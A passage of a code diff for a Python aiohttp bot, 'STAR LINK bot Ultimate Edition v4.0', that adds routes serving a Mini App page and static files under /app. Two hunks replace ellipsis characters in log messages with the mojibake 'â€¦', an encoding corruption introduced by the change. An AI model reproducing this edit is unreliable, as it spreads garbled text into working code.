+    index = os.path.join(WEBAPP_DIR, "index.html")
+    if not os.path.isfile(index):
+        return web.Response(text="Mini App not found", status=404)
+    return web.FileResponse(index)
 
 async def web_server():
     app = web.Application()
     app.router.add_get("/", _web_root)
     app.router.add_get("/health", _web_health)
+    app.router.add_get("/app", _web_app_index)
+    app.router.add_get("/app/", _web_app_index)
+    if os.path.isdir(WEBAPP_DIR):
+        app.router.add_static("/app/static/", WEBAPP_DIR, show_index=False)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
     await site.start()
-    log.info("Web server listening on port %d", WEB_PORT)
+    log.info("Web server listening on port %d (Mini App at /app)", WEB_PORT)
 
 # ============================================================
 # POLLING
@@ -2167,7 +2278,7 @@ async def start_polling():
 # LIFECYCLE
 # ============================================================
 async def _on_shutdown():
-    log.info("Shutting down…")
+    log.info("Shutting downâ€¦")
     for _chat_id, d in list(scan_tasks.items()):
         try:
             d["stop"] = True
@@ -2194,7 +2305,7 @@ async def _on_shutdown():
 
 async def main():
     setup_logging()
-    log.info("Starting STAR LINK bot Ultimate Edition v4.0 …")
+    log.info("Starting STAR LINK bot Ultimate Edition v4.0 â€¦")
 
     _get_conn()
     await load_paid_users()
